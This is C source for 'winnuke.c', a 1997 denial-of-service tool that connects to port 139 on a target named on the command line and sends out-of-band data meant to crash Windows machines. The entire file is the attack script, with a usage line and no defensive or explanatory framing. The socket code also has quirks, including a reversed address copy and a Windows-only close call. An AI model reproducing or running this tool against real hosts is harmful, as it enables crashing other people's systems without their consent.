/* winnuke.c - (05/07/97)  By _eci  */
/* Tested on Linux 2.0.30, SunOS 5.5.1, and BSDI 2.1 */


#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <socket.h>
#include <unistd.h>

#define dport 139  /* Attack port: 139 is what we want */

int x, s;
ssize_t	sent;
char *str = "Hello Windows!";  /* Makes no diff */
struct sockaddr_in addr, spoofedaddr;
struct hostent *host;


int open_sock(int sock, char *server, int port) 
{
	struct sockaddr_in blah;
    struct hostent *he;
    strncpy((char *)&blah, "",sizeof(blah));
    blah.sin_family=AF_INET;
    blah.sin_addr.s_addr=inet_addr(server);
    blah.sin_port=htons(port);


    if ((he = gethostbyname(server)) != NULL) 
    {
    	strncpy(he->h_addr, (char *)&blah.sin_addr, he->h_length);
    }
    else 
    {
        if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) 
        {
        	printf("gethostbyname() fucked up\n");
        	return(0);
        }
    }
    if (connect(sock, (struct sockaddr *)&blah, sizeof(blah)) == -1) 
    {
    	printf("connect() fucked up\n");
    	closesocket(sock);
    	return(0);
    }
    printf("Connected to [%s:%d].\n", server, port);
    return(1);
}


void main(int argc, char *argv[]) {

    if (argc != 2) 
    {
    	printf("Usage: %s <target>\n",argv[0]);
       	return;
    }

    if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) 
    {
        printf("socket() fucked up\n");
        return;
    }

    if(open_sock(s,argv[1],dport))
    {
    	printf("Sending crash... ");
    	sent = send(s,(void *)str,strlen(str),MSG_OOB);
		sleep(1);
    	printf("Done!\n");
    	printf("%d bytes sent. %d should have been sent\n", sent, strlen(str));
    	closesocket(s);
    }
    else
    {
    	closesocket(s);
    }
}   